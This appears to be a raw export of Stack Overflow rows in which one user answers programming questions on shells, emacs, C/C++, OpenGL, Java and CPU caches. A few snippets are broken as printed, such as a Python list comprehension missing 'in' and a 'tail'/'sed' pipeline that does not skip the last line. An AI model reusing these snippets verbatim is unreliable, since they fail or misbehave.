<pre><code>alias ls=""ls --color=auto""
alias hd=""hexdump -C""
</code></pre></li>
<li><p>Colorize <code>grep</code> output:</p>

<pre><code>export GREP_OPTIONS=--color=auto
export GREP_COLORS='ms=01;36'
</code></pre></li>
</ul>
"
"<p>How do I find a tab character in emacs?  </p>
","9530","","<p>Hit <code>C-s</code> to start an incremental search, then type <code>C-q C-i</code> to search for a literal tab character.</p>

<p>If you want to visualize tab characters, you can add the following to your <code>~/.emacs</code> file to colorize tabs:</p>

<pre><code>; Draw tabs with the same color as trailing whitespace
(add-hook 'font-lock-mode-hook
  '(lambda ()
     (font-lock-add-keywords
       nil
        '((""\t"" 0 'trailing-whitespace prepend))
     )
   )
)
</code></pre>
"
"<p>How to read only ""N"" bytes from a specified file?</p>
","9530","","<p>If you want to avoid reading the entire file, you can just use the standard C I/O functions:</p>

<pre><code>#include &lt;stdio.h&gt;
...
FILE *file = fopen(""the-file.dat"", ""rb"");
if(file == NULL)
    ; // handle error
char theBuffer[1000];  // make sure this is big enough!!
size_t bytesRead = fread(theBuffer, 1, 1000, file);
if(bytesRead &lt; 1000)
    ; // handle error
fclose(file);
</code></pre>
"
"<p>The 3rd param to WinMain provides the command line as an unprocessed string. While that may be useful for allowing you to cope with expansion of wildcards and what-not, is there any chance that lurking somewhere in the Win32 API that there's a way to get the usual C argc, argv version of it?</p>
","9530","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/bb776391%28VS.85%29.aspx"" rel=""nofollow""><code>CommandLineToArgvW()</code></a> to convert to an argv-style array of Unicode strings.  Unfortunately, there is no ANSI-string version.  Also, beware that this does not set <code>argv[argc]</code> (i.e. the element after the last argument) to NULL.</p>
"
"<p>I'm trying to use Cygwin to test startup scripts for a Java application that is going to run in a Linux environment.</p>

<p>The troule is when I specify a boothclasspath or Classpath I need to use OS specific path seperators "";"" for windows, and "":"" for Linux. This happens because Java is still a native windows application and uses the native OS path seperator (<a href=""http://www.nabble.com/path-separator-td17704083.html"" rel=""nofollow"">Cygwin List Path Seperator</a> )</p>

<p>Is there any way in the shell script to detect what OS I'm on (or perhaps if I'm running in CYGWIN), and specify the proper path seperator.</p>

<p>I'm trying to set the following:</p>

<pre><code>MAVEN_OPTS=""-Xbootclasspath/a:test/resources:live/resources""
</code></pre>

<p>On Windows it would need to be:
    MAVEN_OPTS=""-Xbootclasspath/a:test/resources;live/resources""</p>
","9530","","<p>You can use <a href=""http://linux.die.net/man/1/uname"" rel=""nofollow""><code>uname(1)</code></a> to test if you're running Cygwin, e.g.:</p>

<pre><code>if uname | grep -iq cygwin; then
    # use ; for path separator
else
    # use : for path separator
fi
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/286061/python-decimal-place-issues-with-floats"">python - decimal place issues with floats</a>  </p>
</blockquote>

<p>In [4]: 52+121.2 </p>

<p>Out[4]: 173.19999999999999 </p>
","9530","","<p>Short answer: Python uses binary arithmetic for floating-point numbers, not decimal arithmetic.  Decimal fractions are not exactly representable in binary.</p>

<p>Long answer: <a href=""http://docs.sun.com/source/806-3568/ncg%5Fgoldberg.html"" rel=""nofollow"">What Every Computer Scientist Should Know About Floating-Point Arithmetic</a></p>
"
"<p>What are some examples where Big-O notation[1] fails in practice?</p>

<p>That is to say: when will the Big-O running time of algorithms predict algorithm A to be faster than algorithm B, yet in practice algorithm B is faster when you run it?</p>

<p>Slightly broader: when do theoretical predictions about algorithm performance mismatch observed running times? A non-Big-O prediction might be based on the average/expected number of rotations in a search tree, or the number of comparisons in a sorting algorithm, expressed as a factor times the number of elements.</p>

<p><strong>Clarification</strong>:</p>

<p>Despite what some of the answers say, the Big-O notation <strong>is</strong> meant to predict algorithm performance.  That said, it's a <strong>flawed</strong> tool: it only speaks about asymptotic performance, and it blurs out the constant factors.  It does this for a reason: it's meant to predict algorithmic performance independent of which computer you execute the algorithm on.</p>

<p><em>What I want to know is this</em>: when do the flaws of this tool show themselves?  I've found Big-O notation to be reasonably useful, but far from perfect.  What are the pitfalls, the edge cases, the gotchas?</p>

<p>An example of what I'm looking for: running Dijkstra's shortest path algorithm with a Fibonacci heap instead of a binary heap, you get O(m + n log n) time versus O((m+n) log n), for n vertices and m edges.  You'd expect a speed increase from the Fibonacci heap sooner or later, yet said speed increase never materialized in my experiments.</p>

<p>(Experimental evidence, without proof, suggests that binary heaps operating on uniformly random edge weights spend O(1) time rather than O(log n) time; that's one big gotcha for the experiments.  Another one that's a bitch to count is the expected number of calls to DecreaseKey).</p>

<p>[1] Really it isn't the <em>notation</em> that fails, but the <em>concepts</em> the notation stands for, and the theoretical approach to predicting algorithm performance.  &lt;/anti-pedantry&gt;</p>

<p><strong>On the accepted answer</strong>:</p>

<p>I've accepted an answer to highlight the kind of answers I was hoping for.  Many different answers which are just as good exist :)  What I like about the answer is that it suggests a general rule for when Big-O notation ""fails"" (when cache misses dominate execution time) which might also increase understanding (in some sense I'm not sure how to best express ATM).</p>
","9530","","<p>The general answer is that Big-O allows you to be really sloppy by hiding the constant factors.  As mentioned in the question, the use of Fibonacci Heaps is one example.  Fibonacci Heaps <em>do</em> have great asymptotic runtimes, but in practice the constants factors are way too large to be useful for the sizes of data sets encountered in real life.</p>

<p>Fibonacci Heaps are often used in proving a good lower bound for asymptotic complexity of graph-related algorithms.</p>

<p>Another similar example is the <a href=""http://en.wikipedia.org/wiki/Coppersmith%E2%80%93Winograd%5Falgorithm"" rel=""nofollow"">Coppersmith-Winograd algorithm</a> for matrix multiplication.  It is currently the algorithm with the fastest known asymptotic running time for matrix multiplication, O(n<sup>2.376</sup>).  However, its constant factor is far too large to be useful in practice.  Like Fibonacci Heaps, it's frequently used as a building block in other algorithms to prove theoretical time bounds.</p>
"
"<p>I am trying to use a function pointer, but the 3 lines below just do not seem to want to cooperate...</p>

<p>I'm getting error code C3867.</p>

<p>Can you see what I'm doing wrong?</p>

<p>In .h file</p>

<pre><code>void MyFunc(int, FILEINFO*(*)(FILEINFO*), FILEINFO*, int);
</code></pre>

<p>The definition in the .cpp file</p>

<pre><code>void MyFunc(int number, FILEINFO*(*GetFiles)(FILEINFO*), FILEINFO* args, int type);
</code></pre>

<p>Then here is where I'm actually calling the function</p>

<pre><code>MyFuncClass-&gt;MyFunc(GetNumber(), &amp;BigClass::PassThis, GetArgs(), TheType);
</code></pre>

<p>Any problems jump out?</p>
","9530","","<p>What is the definition of <code>BigClass::PassThis()</code>?  Is it a static class member function or a regular member function?  If it's a regular member function, you can't do that, because it has a hidden <code>this</code> parameter.  See <a href=""http://www.parashift.com/c%2B%2B-faq-lite/pointers-to-members.html#faq-33.4"" rel=""nofollow"">question 33.4</a> of the C++ FAQ Lite.</p>
"
"<p>I'm trying to write a program in assembly and make the resulting executable as <strong>small as possible</strong>. Some of what I'm doing requires windows API calls to functions such as WriteProcessMemory. I've had some success with calling these functions, but after compiling and linking, my program comes out in the range of 14-15 KB. (From a source of less than 1 KB) I was hoping for much, much less than that.</p>

<p>I'm very new to doing low level things like this so I don't really know what would need to be done to make the program smaller. I understand that the exe format itself takes up quite a bit of space. Can anything be done to minimize that?</p>

<p>I should mention that I'm using NASM and GCC but I can easily change if that would help.</p>
","9530","","<p>See <a href=""http://www.phreedom.org/solar/code/tinype/"" rel=""nofollow"">Tiny PE</a> for a bunch of tips and tricks you can use to reduce the final size of your executable.  Be warned that some of the later techniques in that article are extremely fragile.</p>
"
"<p>Using Python, I'd like to compare every possible pair in a list.</p>

<p>Suppose I have</p>

<pre><code>my_list = [1,2,3,4]
</code></pre>

<p>I'd like to do an operation (let's call it foo) on every combination of 2 elements from the list.</p>

<p>The final result should be the same as</p>

<pre><code>foo(1,1)
foo(1,2)
...
foo(4,3)
foo(4,4)
</code></pre>

<p>My first thought was to iterate twice through the list manually, but that doesn't seem very pythonic.</p>
","9530","","<p>If you're just calling a function, you can't really do much better than:</p>

<pre><code>for i in my_list:
    for j in my_list:
        foo(i, j)
</code></pre>

<p>If you want to collect a list of the results of calling the function, you can do:</p>

<pre><code>[foo(i, j) for i my_list for j in my_list]
</code></pre>

<p>which will return you a list of the result of applying <code>foo(i, j)</code> to each possible pair <code>(i, j)</code>.</p>
"
"<p>Visual C++ has a compiler setting ""Enable C++ Exceptions"" which can be set to ""No"". What exactly will happen if I set it this way? My code never explicitly throws or catches exceptions (and therefore the first thrown exception will terminate the program anyway) and doesn't rely on stack unwinding - should I expect any more undesired behaviour from the recompiled program?</p>
","9530","","<p>If <code>operator new</code> fails to allocate memory, I believe that it will return <code>NULL</code> instead of throwing an <code>std::bad_alloc</code> exception.</p>

<p>If you make any calls to third-party libraries that throw exceptions, much badness will result.</p>
"
"<p>I have a few questions regarding Cache memories used in Multicore CPUs or Multiprocessor systems. (Although not directly related to programming, it has many repercussions while one writes software for multicore processors/multiprocessors systems, hence asking here!)</p>

<ol>
<li><p>In a multiprocessor system or a multicore processor (Intel Quad Core, Core two Duo etc..) does each cpu core/processor have its own cache memory (data and program cache)?</p></li>
<li><p>Can one processor/core access each other's cache memory, because if they are allowed to access each other's cache, then I believe there might be lesser cache misses, in the scenario that if that particular processors cache does not have some data but some other second processors' cache might have it thus avoiding a read from memory into cache of first processor? Is this assumption valid and true?</p></li>
<li><p>Will there be any problems in allowing any processor to access other processor's cache memory?</p></li>
</ol>
","9530","","<ol>
<li><p>Yes.  It varies by the exact chip model, but the most common design is for each CPU core to have its own private L1 data and instruction caches.  The L2 unified cache is typically shared between all cores.</p></li>
<li><p>No.  Each CPU core's L1 caches are on the same die as the core and cannot be accessed by other cores.  The cores are each connected to the L2 cache via the shared data bus.</p></li>
<li><p>Yes -- there simply aren't wires connecting the various CPU caches to the other cores.  If a core wants to access data in another core's cache, the only data path through which it can do so is the system bus.</p></li>
</ol>

<p>A very important related issue is the <a href=""http://en.wikipedia.org/wiki/Cache%5Fcoherency"">cache coherency problem</a>.  Consider the following: suppose one CPU core has a particular memory location in its cache, and it writes to that memory location.  Then, another core reads that memory location.  How do you ensure that the second core sees the updated value?  That is the cache coherency problem.  There are a variety of solutions; see Wikipedia et al.</p>
"
"<p>When contributing to a very old, and apparently no longer maintained, open-source or public domain project, is it suggested practice to follow the original author's coding style even if it is terrible? </p>

<p>More importantly, are there any reasons why one would want to follow the original author's coding style rather than clean it up significantly?</p>
","9530","","<p>Follow the original coding style.  It is far, far better to be <em>consistent</em>, even if it's not pretty to you.</p>

<p>If you do decide to clean up the coding style, do it separately from any other changes.  Don't clutter up source control diff's with style changes.  Make one (or several) checkins where the <em>only</em> thing you're doing is changing code style.  Do not mix in real changes with meaningless changes, it makes it impossible to locate relevant changes when reviewing source control commits.</p>
"
"<p>You can specify a range of lines to operate on. For example, to operate on all lines, (which is of course the default):</p>

<pre><code>sed -e ""1,$ s/a/b/""
</code></pre>

<p>But I need to operate on all but the last line. You apparently can't use arithmetic expressions:</p>

<pre><code>sed -e ""1,$-1 s/a/b/""
</code></pre>

<p>(I am using cygwin in this case, if it make a difference)</p>
","9530","","<p>Well, you could hack it with something like this:</p>

<pre><code>sed -e ""1,$(($(cat the-file | wc -l) - 1))s/a/b/""
</code></pre>

<p>Or, you could use <code>tail</code> instead:</p>

<pre><code>(tail +1 the-file) | sed -e s/a/b/; tail -1 the-file
</code></pre>
"
"<p>Is there a Linux command that will list all available commands and aliases for this terminal session?</p>

<p>As if you typed 'a' and pressed tab, but for every letter of the alphabet.
Or running 'alias' but also returning commands.</p>

<p>Why?  I'd like to run the following and see if a command is available:</p>

<pre><code>ListAllCommands | grep searchstr
</code></pre>
","9530","","<p>Here's a solution that gives you a list of all executables <em>and</em> aliases.  It's also portable to systems without <code>xargs -d</code> (e.g. Mac OS X), and properly handles paths with spaces in them.</p>

<pre><code>#!/bin/bash
(echo -n $PATH | tr : '\0' | xargs -0 -n 1 ls; alias | sed 's/alias \([^=]*\)=.*/\1/') | sort -u | grep ""$@""
</code></pre>

<p>Usage: <code>myscript.sh [grep-options] pattern</code>, e.g. to find all commands that begin with <code>ls</code>, case-insensitive, do:</p>

<pre><code>myscript -i ^ls
</code></pre>
"
"<p>In order to ensure that some initialization code runs before <code>main</code> (using Arduino/avr-gcc) I have code such as the following:</p>

<pre><code>class Init {
public:
    Init() { initialize(); }
};

Init init;
</code></pre>

<p>Ideally I'd like to be able to simply write:</p>

<pre><code>initialize();
</code></pre>

<p>but this doesn't compile...</p>

<p>Is there a less verbose way to achieve the same effect?</p>

<p><strong>Note:</strong> the code is part of an Arduino sketch so the <code>main</code> function is automatically generated and cannot be modified (for example to call <code>initialize</code> before any other code).</p>

<p><strong>Update:</strong> ideally the initialization would be performed in the <code>setup</code> function, but in this case there is other code depending on it which occurs before <code>main</code>.</p>
","9530","","<p>You can use GCC's <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g%5Ft%5F0040code%5F007bconstructor%5F007d-function-attribute-2220""><code>constructor</code> attribute</a> to ensure that it gets called before <code>main()</code>:</p>

<pre><code>void Init(void) __attribute__((constructor));
void Init(void) { /* code */ }  // This will always run before main()
</code></pre>
"
"<p>I need a good reference in how to get my hooks into Darwin. Basically I'd like to write an app the take care of some of the admin chores I do on my Macs. For example, moving new media to the backup server sorted by media type, pulling process info. Simple things like that. So basically I'd like to create a nifty GUI app that would call my shell scripts and give me the output of those scripts.</p>

<p>Is there anything equivilent to python's subprocess or C#'s Process library?</p>

<p>Links would suffice just fine.</p>

<p>Thanks.</p>
","9530","","<p>You can use the <a href=""http://linux.die.net/man/3/system"" rel=""nofollow""><code>system(3)</code></a> function to have the shell execute a command line:</p>

<pre><code>system(""path/to/my/shellscript.sh"");
</code></pre>
"
"<p>I recently got stuck in a situation like this:</p>

<pre><code>class A
{
public:
    typedef struct/class {...} B;
...
    C::D *someField;
}

class C
{
public:
    typedef struct/class {...} D;
...
    A::B *someField;
}
</code></pre>

<p>Usually you can declare a class name:</p>

<pre><code>class A;
</code></pre>

<p>But you can't forward declare a nested type, the following causes compilation error.</p>

<pre><code>class C::D;
</code></pre>

<p>Any ideas?</p>
","9530","","<p>You can't do it, it's a hole in the C++ language.  You'll have to un-nest at least one of the nested classes.</p>
"
"<p>I've seen code like the following frequently in some C++ code I'm looking at:</p>

<pre><code>typedef class SomeClass SomeClass;
</code></pre>

<p>I'm stumped as to what this actually achieves.  It seems like this wouldn't change anything. What do <code>typedef</code>s like this do? And if this does something useful, is it worth the extra effort?</p>
","9530","","<p>It prevents code like this from compiling:</p>

<pre><code>class SomeClass { ... };
int SomeClass;
</code></pre>

<p>This is perfectly legal C++, though it's <em>terrible</em>.  If you do this, then any references to a bare <code>SomeClass</code> refer to the variable.  To refer to the class, you need to explicitly say <code>class SomeClass</code> at each usage.  If you create a <code>typedef</code>:</p>

<pre><code>class SomeClass { ... };
typedef class SomeClass SomeClass;
int SomeClass;
</code></pre>

<p>Then the compiler flags the definition of <code>int SomeClass</code> as an error, as it rightly should be.</p>
"
"<p>I'm writing a real-time operation system from scratch for a course project. I want to know the end address of my code after I download it to the chip, because I am planning to use the free memory for stack space and I need make sure that I won't overwrite the existing code.</p>

<p>I heard about __end variable provided by GCC is the end of the code, but I have no idea about what is the meaning of __end and how to use it in my code. Could anyone explain it a little bit or provide links to some materials, cos I couldn't google __end?</p>

<p>Thanks a lot.  </p>
","9530","","<p>You could use a linker script.  In your C code, declare:</p>

<pre><code>// call this whatever you want; the linker will fill this in with the address
// of the end of code
extern uint32_t endOfCode;
</code></pre>

<p>Then, in your linker script, add the following immediately after the definition of the <code>.text</code> section:</p>

<pre><code>PROVIDE(endOfCode = .);
</code></pre>

<p>I'm not very familiar with linker scripts, so I can't provide a complete, working example.  You'll have to take the default linker script (which I'm not sure how one obtains) and modify it as above, then use the <code>-T</code> option of the linker to specify it.  Good luck!</p>
"
"<p>Why isn't my UILabel being changed? I am using the following code, and nothing is happening:</p>

<pre><code>- (void)awakeFromNib {
    percentCorrect.adjustsFontSizeToFitWidth;
    percentCorrect.numberOfLines = 3;
    percentCorrect.minimumFontSize = 100;
}
</code></pre>

<p>Here is my Implemintation code:</p>

<pre><code>- (void) updateScore {
    double percentScore = 100.0 * varRight / (varWrong + varRight);
    percentCorrect.text = [NSString stringWithFormat:@""%.2f%%"", percentScore];
}

- (void)viewDidLoad {
    percentCorrect.adjustsFontSizeToFitWidth = YES;
    percentCorrect.numberOfLines = 3;
    percentCorrect.minimumFontSize = 100;
    percentCorrect.text = @""sesd"";
}


- (void)correctAns {
    numberRight.text = [NSString stringWithFormat:@""%i Correct"", varRight];
}

-(void)wrongAns {
    numberWrong.text = [NSString stringWithFormat:@""%i Incorrect"", varWrong];
}

#pragma mark Reset Methods
- (IBAction)reset:(id)sender; {
    NSString *message = @""Are you sure you would like to reset?"";
    self.wouldYouLikeToReset = [[UIAlertView alloc] initWithTitle:@""Reset?"" message:message delegate:self cancelButtonTitle:@""Cancel"" otherButtonTitles:nil];
    [wouldYouLikeToReset addButtonWithTitle:@""Continue""];
    [self.wouldYouLikeToReset show];
    // Now goes to (void)alertView and see's what is being pressed!
}

- (void)alertView:(UIAlertView *)actionSheet clickedButtonAtIndex:(NSInteger)buttonIndex {
    if (buttonIndex == 0)
    {
    	NSLog(@""Cancel button pressed"");
    }
    else
    {
    	varRight = 0;
    	varWrong = 0;
    	[self wrongAns];
    	[self correctAns];
    	percentCorrect.text = [NSString stringWithFormat:@""0.0%%""];

    }
}

#pragma mark Button Action Methods

- (IBAction)right:(id)sender; {
    varRight++;
    [self correctAns];
    [self updateScore];
}

- (IBAction)wrong:(id)sender; {
    varWrong++;
    [self wrongAns];
    [self updateScore];
}


- (IBAction)subOneRight:(id)sender {
    if (varRight &gt; 0 ) {
    	varRight--;
    	[self correctAns];
    	[self updateScore];
    }
}


- (IBAction)subOneWrong:(id)sender {
    if (varWrong &gt; 0) {
    	varWrong--;
    	[self wrongAns];
    	[self updateScore];
    }
}

-(IBAction)addHalfCredit:(id)sender;
{
    varWrong++;
    varRight++;
    [self wrongAns];
    [self correctAns];
    [self updateScore];
}


@end
</code></pre>

<p>Any ideas? 
Thanks</p>
","9530","","<p>It's possible that <code>percentCorrect</code> hasn't yet been initialized.  Is <code>percentCorrect</code> equal to <code>nil</code> when that function is called, by any chance?  If so, wait until after it's properly initialized to set its properties.</p>
"
"<p>My bash init script (~/.profile) contains important initializations, but whenever I use shell-command or compile in emacs, that init file is not read, and without those initialization my bash commands in emacs will fail :( How do I force emacs to execute my init file for the shell that it's using for shell-command?</p>

<p>Clarification: I'm not talking about M-x shell, which reads my init file just fine when I symlinked .profile to .emacs_bash.</p>
","9530","","<p>Move your initialization routines into your <code>~/.bashrc</code> file, and then add the line</p>

<pre><code>source ~/.bashrc
</code></pre>

<p>into your <code>~/.bash_profile</code> file. See the <a href=""http://linux.die.net/man/1/bash"" rel=""nofollow"">bash man page</a> for a detailed explanation of which startup files get loaded when. They key is the difference between an <em>interactive</em> and <em>non-interactive</em> shell, as well as the difference between a <em>login</em> and a <em>non-login</em> shell.</p>

<p>In general, <code>.bash_profile</code> is run when logging into the system using a shell while <code>.bashrc</code> is run when starting a new shell (The OS X Terminal application is an exception to this rule as it runs <code>.bash_profile</code> for each new terminal instance). For more info in article form, <a href=""http://www.joshstaiger.org/archives/2005/07/bash_profile_vs.html"" rel=""nofollow"">look here.</a></p>
"
"<p>I know how to convert binary to decimal. I know at least 2 methods: table and power ;-)</p>

<p>I want to convert binary to decimal and print this decimal. Moreover, I'm not interested in this `decimal'; I want just to print it.</p>

<p>But, as I wrote above, I know only 2 methods to convert binary to decimal and both of them required addition. So, I'm computing some value for 1 or 0 in binary and add it to the remembered value. This is a thin place. I have a really-really big number (1 and 64 zeros). While converting I need to place some intermediate result in some 'variable'. In C, I have an `int' type, which is 4 bytes only and not more than 10^11.</p>

<p>So, I don't have enough memory to store intermedite result while converting from binary to decimal. As I wrote above, I'm not interested in THAT decimal, I just want to print the result. But, I don't see any other ways to solve it ;-( Is there any solution to ""just print"" from binary?</p>

<p>Or, maybe, I should use something like BCD (Binary Coded Decimal) for intermediate representation? I really don't want to use this, 'cause it is not so cross-platform (Intel's processors have a built-in feature, but for other I'll need to write own implementation).</p>

<p>I would glad to hear your thoughts. Thanks for patience.</p>

<p>Language: C.</p>
","9530","","<p>I highly recommend using a library such as <a href=""http://gmplib.org/"">GMP</a> (GNU multiprecision library).  You can use the <code>mpz_t</code> data type for large integers, the various <a href=""http://gmplib.org/manual/Integer-Import-and-Export.html#Integer-Import-and-Export"">import/export routines</a> to get your data into an <code>mpz_t</code>, and then use <a href=""http://gmplib.org/manual/I%5F002fO-of-Integers.html#I%5F002fO-of-Integers""><code>mpz_out_str()</code></a> to print it out in base 10.</p>
"
"<p>I just ported a .obj loader to objective-C and so far, it works, I can get my vertices and normals and stuff.
Every normal is good, pointing in the right direction, all my faces are in CCW winding, but I have some issues with the depth test.</p>

<pre><code>float rotX = 0;
float rotY = 0;
objModel* o = [[objModel alloc] initWithPath:@""/model.obj""]

glClearColor(0,0,0,0);

glEnable(GL_DEPTH_TEST);
glFrontFace(GL_CCW);
glCullFace(GL_BACK); 
glEnable(GL_CULL_FACE);
glEnable(GL_LIGHTING);
glEnable(GL_LIGHT0);
glEnable(GL_COLOR_MATERIAL);

glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);

glMatrixMode(GL_PROJECTION);
glLoadIdentity();   
glMatrixMode(GL_MODELVIEW);
glLoadIdentity();
glTranslated(0, -1, 0);
glRotatef(90,0,0,1);
glRotatef(90,0,1,0);
glRotatef(rotX,0,0,-1);
glRotatef(rotY,0,1,0);

[o drawObjWithArrays]

glFlush();
</code></pre>

<p>I have 2 different ways of drawing my object, one uses glBegin() / glEnd(), the other uses vertex and normal arrays with a call to glDrawArrays(). Both of them result in the same problem : faces that should be hidden by faces in front of them are displayed, because the depth test isn't working. The faces are drawn in the order they come in the .obj file.</p>

<p>You'll find an image here : <a href=""http://img524.imageshack.us/img524/994/image2jgq.png"">http://img524.imageshack.us/img524/994/image2jgq.png</a></p>

<p>I quite new to OpenGL and objective-C, so I guess my problem comes from a setting that I forgot. Here they are :</p>

<pre><code>-(id) initWithFrame:(NSRect) frame {
NSLog(@""INIT GL VIEW\n"");

GLuint attributes[] = {
	NSOpenGLPFANoRecovery,
	NSOpenGLPFAWindow,
	NSOpenGLPFAAccelerated,
	NSOpenGLPFADoubleBuffer,
	NSOpenGLPFAColorSize, 24,
	NSOpenGLPFAAlphaSize, 8,
	NSOpenGLPFADepthSize, 24,
	NSOpenGLPFAStencilSize, 8,
	NSOpenGLPFAAccumSize, 0,
	0
};

NSOpenGLPixelFormat* fmt = [[NSOpenGLPixelFormat alloc] initWithAttributes:(NSOpenGLPixelFormatAttribute*) attributes];
if (!fmt)
	NSLog(@""No OpenGL pixel format"");

GLfloat   mat_ambient[]		= {0.0, 0.0, 1.0, 1.0};
GLfloat   mat_flash[]		= {0.0, 0.0, 1.0, 1.0};
GLfloat   mat_flash_shiny[] = {50.0};
GLfloat   light_position[]  = {100.0,-200.0,-200.0,0.0};
GLfloat   ambi[]            = {0.1, 0.1, 0.1, 0.1};
GLfloat   lightZeroColor[]  = {0.9, 0.9, 0.9, 0.1};

/* set the material */
glLightfv(GL_LIGHT0, GL_POSITION, light_position);
glLightfv(GL_LIGHT0, GL_AMBIENT, ambi);
glLightfv(GL_LIGHT0, GL_DIFFUSE, lightZeroColor);

glMaterialfv(GL_FRONT, GL_SHININESS, mat_flash_shiny);	
glMaterialfv(GL_FRONT, GL_SPECULAR, mat_flash);
glMaterialfv(GL_FRONT, GL_AMBIENT, mat_ambient);

return self = [super initWithFrame:frame pixelFormat:[fmt autorelease]]; 
}
</code></pre>

<p>Anyone can help me ? I've tried everyone glDepthFunc, glCullFace, glFrontFace combination possible, nothing works...</p>

<p>Thanks ^^</p>
","9530","","<p>Make sure you call <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/depthfunc.html"" rel=""nofollow""><code>glDepthFunc()</code></a> to set the depth buffer comparison function.  Most applications use <code>GL_LEQUAL</code> or <code>GL_LESS</code> for the depth function.  Also make sure you call <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/cleardepth.html"" rel=""nofollow""><code>glClearDepth()</code></a> to set the value that the depth buffer gets cleared to; you should probably use a parameter of <code>1.0</code> for this to clear to maximum depth.</p>
"
"<pre><code>File file = new File(""path to file alias foo"");
</code></pre>

<p>where ""path to file alias foo"" is an alias reports file size to be 0 instead of the actual file size. I found a workaround to test for aliases:</p>

<pre><code>public boolean isLink() {
        try {
            if (file.getAbsolutePath().equals(file.getCanonicalPath())) {
                return false;
            }
        } catch (IOException ex) {
            logger.severe(ex.getMessage());
        }
        return true;
    }
</code></pre>

<p><strong>EDIT</strong> Actually this code does not work, as pointed out by a poster below. I was trying to adapt a solution from a linux symlink example, but I didn't realize that finder aliases and symlinks were not the same.</p>

<p><strong>NOT!</strong> this seems to work, but ....</p>

<pre><code>file.getCanonicalFile().length();
</code></pre>

<p>still reports file length to be 0. Can anyone point me in the right direction?</p>
","9530","","<p>Finder aliases are a different beast altogether from normal symbolic links.  The *nix tools on OS X are not aware of aliases at all, because they're stored in the resource fork, I believe.  If you install <a href=""http://osxutils.sourceforge.net/"" rel=""nofollow""><code>osxutils</code></a>, you can use this shell command to get the target of an alias:</p>

<pre><code>hfsdata -e the-alias
</code></pre>

<p>From Java, I don't know of a better way of doing this other than calling <code>Runtime.exec(...)</code>.</p>

<p>Also, I just a did a quick check, and your function for detecting aliases does not work.  AFAICT, Java is not aware of Finder aliases.  If you <em>really</em> want to support them, then you'll either need to use something like <code>osxutils</code>, or use some platform-specific code to read resource forks (will probably involve JNI).  Neither option is pretty.</p>

<p>If you go the JNI route, check out the <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html"" rel=""nofollow"">Alias Manager Reference</a> documentation.  The relevant functions are <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html#//apple%5Fref/c/func/FSIsAliasFile"" rel=""nofollow""><code>FSIsAliasFile</code></a> and <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html#//apple%5Fref/c/func/FSResolveAliasFile"" rel=""nofollow""><code>FSResolveAliasFile</code></a>.</p>
"
"<p>I'm writing C++ console programs. After compilation, when I run the program from my file browser, cmd.exe automatically closes such that I can't see my programs output.</p>

<p>The only way to work around this I've found is to run the program from inside cmd.exe</p>

<p>Is there anyway to keep cmd.exe open after a program finishes running?</p>

<p>Is there a setting I can change somewhere? I don't want to run a batch script with cmd.exe /K</p>

<p>Thanks!</p>

<p>[Edit] Don't know if this matters, but I'm on Vista x64</p>
","9530","","<p>As the last line of your <code>main()</code> function, you can add this line:</p>

<pre><code>system(""PAUSE"");
</code></pre>

<p>Also, make sure to <code>#include &lt;stdlib.h&gt;</code> to declare the <code>system()</code> function.  This will make the console pause.  However, if your program is run from inside <code>cmd.exe</code>, this will still pause, which may be undesirable.</p>
"
"<p>I'm trying to compile a very simple program in Java 1.6 on Ubuntu Jaunty, using Apache Commons Config jar.  I keep getting the ""package org.apache.commons.configuration does not exist"" error, even though the jar is in the same directory.  Any ideas?</p>

<ul>
<li>Directory Listing</li>
</ul>

<pre>
~/source/UpdateStockHistory$ ll
total 304
-rw-r--r-- 1 crosse crosse 298829 2009-06-07 17:36 commons-configuration-1.6.jar
-rw-r--r-- 1 crosse crosse    149 2009-06-07 17:16 UpdateStockHistory.config.xml
-rw-r--r-- 1 crosse crosse    531 2009-06-07 17:46 UpdateStockHistory.java
</pre>

<ul>
<li>Java Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ javac -version
javac 1.6.0_13
</pre>

<ul>
<li>OS Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 9.04
Release:        9.04
Codename:       jaunty
</pre>

<ul>
<li>Compiler Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ javac UpdateStockHistory.java
UpdateStockHistory.java:2: package org.apache.commons.configuration does not exist
import org.apache.commons.configuration.*;
^
UpdateStockHistory.java:8: cannot find symbol
symbol  : class ConfigurationFactory
location: class com.crosse.tradingresearch.UpdateStockHistory
                        ConfigurationFactory factory = new ConfigurationFactory(""UpdateStockHistory.config.xml"");
                        ^
UpdateStockHistory.java:8: cannot find symbol
symbol  : class ConfigurationFactory
location: class com.crosse.tradingresearch.UpdateStockHistory
                        ConfigurationFactory factory = new ConfigurationFactory(""UpdateStockHistory.config.xml"");
                                                           ^
UpdateStockHistory.java:9: cannot find symbol
symbol  : class Configuration
location: class com.crosse.tradingresearch.UpdateStockHistory
                        Configuration config = factory.getConfiguration();
                        ^
4 errors

</pre>

<p>Hate to ask such a ""do it for me"" question, but I've run out of ideas.</p>
","9530","","<p>Try adding the jar to your classpath as so:</p>

<pre><code>javac UpdateStockHistory.java -cp commons-configuration-1.6.jar
</code></pre>
"
"<p>If I know an emacs command name, says, ""goto-line""; what if I want to query whether if there are any key-sequences bound to this command ?</p>

<p>And vice versa, given a key sequence, how can I find its command name ?</p>
","9530","","<p>You can get help for a command by typing</p>

<pre><code>C-h f function-name
</code></pre>

<p>This will usually tell you if it has a standard key binding.  Conversely, given a key sequence, you can type</p>

<pre><code>C-h k key-sequence
</code></pre>

<p>To get the command that would run.  For more help on getting help, you can type</p>

<pre><code>C-h ?
</code></pre>
"
"<p>I am working my way through some Objective-C code that I did not write and have found a variable declaration style that I am unfamiliar with. Can anyone tell me the scope of the variable 'myVar' in the class implementation below? Note that this appears in the '.m' file and not the interface declaration.</p>

